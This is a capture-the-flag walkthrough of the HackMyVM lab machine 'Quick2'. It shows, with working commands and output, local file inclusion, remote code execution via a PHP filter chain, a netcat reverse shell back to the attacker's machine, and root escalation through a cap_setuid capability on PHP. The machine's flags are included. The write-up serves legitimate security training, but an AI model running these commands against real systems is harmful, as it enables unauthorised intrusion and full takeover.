# Quick2

## Recon

::: details nmap_scan.log.md
```log
Open 10.0.2.104:80
Open 10.0.2.104:22
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -sV -sC -Pn" on ip 10.0.2.104
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 17:c4:c9:b5:94:24:9f:9c:db:33:34:d1:99:b7:23:1e (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBFHI/qo1ofs6k4AY8sAzJjuUmu1Up6+9pXN3x40ZE/LAai3qdRZjyHGv6ZA6oNvD7HVU6xc5qst1eXhKmYCt/Jo=
|   256 ce:83:07:4b:42:70:87:47:37:4d:d9:d6:8d:56:28:62 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOYCF2xHwVWeRWEGtNXiZCwpiUWDnHlPShmy/Vsv9iSz
80/tcp open  http    syn-ack Apache httpd 2.4.52 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Quick Automative
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
:::

## HTTP

### LFI

The `Quick1` has RFI, but now it's LFI

![writeup.png](/assets/pentest/hackmyvm/quick2/writeup.png)

```bash
└─$ curl 'http://10.0.2.104/index.php?page=/etc/passwd' -s | htmlq main -t | grep sh$
        root:x:0:0:root:/root:/bin/bash
andrew:x:1000:1000:Andrew Speed:/home/andrew:/bin/bash
nick:x:1001:1001:Nick Greenhorn,,,:/home/nick:/bin/bash
```

Logs are not readable and `php://` wrapper doesn't also work.
```bash
└─$ curl 'http://10.0.2.104/index.php?page=/var/log/apache2/access.log' -s
└─$ curl 'http://10.0.2.104/index.php?page=/etc/apache2/access.log' -s | htmlq main -t
```

### LFI2RCE

```bash
└─$ feroxbuster -u http://10.0.2.104 -w /usr/share/seclists/Discovery/Web-Content/common.txt --thorough -D -C 404,400,414,500,403 --dont-scan css,png,jpeg,jpg,gif -n -x .php
200      GET       19l      185w     1446c http://10.0.2.104/about.php
200      GET       30l      132w     1502c http://10.0.2.104/cars.php
302      GET        0l        0w        0c http://10.0.2.104/send_email.php => contact.php
200      GET       37l      116w     1395c http://10.0.2.104/contact.php
200      GET       13l       20w      200c http://10.0.2.104/file.php
200      GET       57l      272w     2539c http://10.0.2.104/home.php
301      GET        9l       28w      309c http://10.0.2.104/images => http://10.0.2.104/images/
200      GET       90l      344w     3825c http://10.0.2.104/index.php
200      GET       90l      344w     3825c http://10.0.2.104/
200      GET       16l       64w      560c http://10.0.2.104/news.php
```

![writeup-1.png](/assets/pentest/hackmyvm/quick2/writeup-1.png)

PHP wrappers work here
```bash
└─$ curl 'http://10.0.2.104/file.php' -G --data-urlencode 'file=php://filter/convert.base64-encode/resource=/etc/passwd' -s | html2markdown | tail +4 | base64 -d | grep sh$
root:x:0:0:root:/root:/bin/bash
andrew:x:1000:1000:Andrew Speed:/home/andrew:/bin/bash
nick:x:1001:1001:Nick Greenhorn,,,:/home/nick:/bin/bash
```

Get RCE is via PHP Filters Chain
- [https://www.synacktiv.com/publications/php-filters-chain-what-is-it-and-how-to-use-it](https://www.synacktiv.com/publications/php-filters-chain-what-is-it-and-how-to-use-it)
- [https://github.com/synacktiv/php_filter_chain_generator](https://github.com/synacktiv/php_filter_chain_generator)

```bash
└─$ curl -LOs https://raw.githubusercontent.com/synacktiv/php_filter_chain_generator/refs/heads/main/php_filter_chain_generator.py
└─$ py php_filter_chain_generator.py --chain '<?php system("id");?>' | tail -1 > payload.txt
└─$ curl 'http://10.0.2.104/file.php' -G --data-urlencode "file=$(cat payload.txt)" -so- | grep uid -a
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

```bash
└─$ py php_filter_chain_generator.py --chain '<?=`$_REQUEST[0]`?>' | tail -1 > payload.txt
└─$ curl 'http://10.0.2.104/file.php' -G --data-urlencode "file=$(cat payload.txt)" --data-urlencode '0=busybox nc 10.0.2.15 4444 -e /bin/bash' -so-
---
└─$ penelope -p 4444
www-data@quick2:/var/www/html$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Privilege Escalation

No SUIDs
```bash
www-data@quick2:/var/www/html$ find / -perm -4000 -ls 2>/dev/null | grep -v snap
     8897     60 -rwsr-xr-x   1 root     root        59976 Nov 24  2022 /usr/bin/passwd
     8724     72 -rwsr-xr-x   1 root     root        72712 Nov 24  2022 /usr/bin/chfn
     8726     44 -rwsr-xr-x   1 root     root        44808 Nov 24  2022 /usr/bin/chsh
     8896     72 -rwsr-xr-x   1 root     root        72072 Nov 24  2022 /usr/bin/gpasswd
      896     32 -rwsr-xr-x   1 root     root        30872 Feb 26  2022 /usr/bin/pkexec
     1185     36 -rwsr-xr-x   1 root     root        35192 Feb 21  2022 /usr/bin/umount
    15125     40 -rwsr-xr-x   1 root     root        40496 Nov 24  2022 /usr/bin/newgrp
    15000    228 -rwsr-xr-x   1 root     root       232416 Apr  3  2023 /usr/bin/sudo
      679     36 -rwsr-xr-x   1 root     root        35200 Mar 23  2022 /usr/bin/fusermount3
      828     48 -rwsr-xr-x   1 root     root        47480 Feb 21  2022 /usr/bin/mount
     1109     56 -rwsr-xr-x   1 root     root        55672 Feb 21  2022 /usr/bin/su
      305     36 -rwsr-xr--   1 root     messagebus    35112 Oct 25  2022 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
    15802    332 -rwsr-xr-x   1 root     root         338536 Jan  2  2024 /usr/lib/openssh/ssh-keysign
     9169     20 -rwsr-xr-x   1 root     root          18736 Feb 26  2022 /usr/libexec/polkit-agent-helper-1
```

The PHP binary has the `cap_setuid` capability with effective+permitted (`ep`) set. That means PHP can change its UID in ways a normal unprivileged binary cannot.
```bash
www-data@quick2:/var/www/html$ getcap -r / 2>/dev/null | grep -v snap
/usr/bin/ping cap_net_raw=ep
/usr/bin/mtr-packet cap_net_raw=ep
/usr/bin/php8.1 cap_setuid=ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper cap_net_bind_service,cap_net_admin=ep
```

- [https://gtfobins.github.io/gtfobins/php/#capabilities](https://gtfobins.github.io/gtfobins/php/#capabilities)

```bash
www-data@quick2:/var/www/html$ /usr/bin/php8.1 -r "posix_setuid(0); system('bash -p');"
root@quick2:/var/www/html# id
uid=0(root) gid=33(www-data) groups=33(www-data)
```

## Flags

```bash
root@quick2:/var/www/html# cat /home/nick/user.txt /root/root.txt | grep -o 'HMV{.*}'
HMV{Its-gonna-be-a-fast-ride}
HMV{This-was-a-Quick-AND-fast-machine}
```